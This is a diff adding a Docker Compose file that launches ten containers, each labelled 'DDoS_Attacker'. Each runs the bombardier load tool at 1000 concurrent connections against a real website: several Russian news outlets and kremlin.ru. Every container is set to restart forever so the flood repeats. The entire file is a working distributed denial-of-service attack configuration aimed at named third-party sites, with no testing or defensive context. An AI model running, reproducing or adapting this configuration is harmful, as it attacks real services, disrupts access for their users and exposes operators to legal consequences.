@@ -1,0 +1,53 @@
+version: "3.9"
+services:
+  s0:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_0"
+    command: [ "-c", "1000", "-d", "60s", "-l", "https://lenta.ru/" ]
+    restart: "always"
+  s1:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_1"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ria.ru/"]
+    restart: "always"
+  s2:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_2"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://ria.ru/lenta/"]
+    restart: "always"
+  s3:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_3"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.rbc.ru/"]
+    restart: "always"
+  s4:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_4"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://www.rt.com/"]
+    restart: "always"
+  s5:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_5"
+    command: ["-c", "1000", "-d", "60s", "-l", "http://kremlin.ru/"]
+    restart: "always"
+  s6:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_6"
+    command: ["-c", "1000", "-d", "60s", "-l", "http://en.kremlin.ru/"]
+    restart: "always"
+  s7:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_7"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://smotrim.ru/"]
+    restart: "always"
+  s8:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_8"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://tass.ru/"]
+    restart: "always"
+  s9:
+    image: alpine/bombardier
+    container_name: "DDoS_Attacker_9"
+    command: ["-c", "1000", "-d", "60s", "-l", "https://tvzvezda.ru/"]
+    restart: "always"
+
